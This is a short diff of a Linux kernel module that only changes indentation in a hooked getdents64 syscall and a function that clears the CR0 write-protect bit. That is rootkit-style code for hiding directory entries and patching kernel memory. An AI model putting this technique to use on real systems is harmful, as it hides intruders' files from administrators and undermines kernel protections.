@@ -88,7 +88,7 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 			// Now update all the offsets in the directory entries.
 			for (long k = 0; k < n_read; ) {
 				d = (struct linux_dirent64 *) (dents_buf + k);
-                                k += d->d_reclen;
+				k += d->d_reclen;
 				d->d_off = k;
 			}
 		} else {
@@ -97,7 +97,7 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 	}
 
 	// Put the (potentially modified) directory entries back into user memory.
-        if (copy_to_user(dents, dents_buf, n_read))
+	if (copy_to_user(dents, dents_buf, n_read))
 		return -1;
 
 	return n_read;
@@ -131,7 +131,7 @@ static void disable_write_prot(void)
 {
 	unsigned long cr0 = read_cr0();
 	clear_bit(16, &cr0);
-        asm volatile("mov %0, %%cr0" : "+r"(cr0) : : "memory");
+	asm volatile("mov %0, %%cr0" : "+r"(cr0) : : "memory");
 }
 
 static int __init init_getdents64_hook(void)
